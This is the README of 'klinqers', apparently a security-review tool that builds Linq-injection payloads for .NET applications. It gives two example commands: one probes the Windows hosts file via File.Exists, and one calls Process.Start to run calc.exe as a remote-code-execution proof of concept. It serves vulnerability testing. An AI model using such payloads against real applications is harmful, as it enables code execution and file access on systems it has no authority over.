# klinqers

This project is used for reviewing Linq-injection bugs. Linq injections although ... I guess rare? when they exist... may potentially cause RCE, arbitrary file reads etc. 

See more about these kind of issues here:
- https://insinuator.net/2016/10/linq-injection-from-attacking-filters-to-code-execution/
- https://stackoverflow.com/questions/8738953/is-injection-possible-through-dynamic-linq


## Examples

**Example 1** - create an injectable code for File.Exists()

`klinqers.exe --call "System.IO.File.Exists(c:/windows/system32/drivers/etc/hosts)" `


**Example 2** - create an injectable code for Process.Start() .. if that works it is direct RCE

`klinqers.exe --call "System.Diagnostics.Process.Start(cmd,/c calc.exe)" `
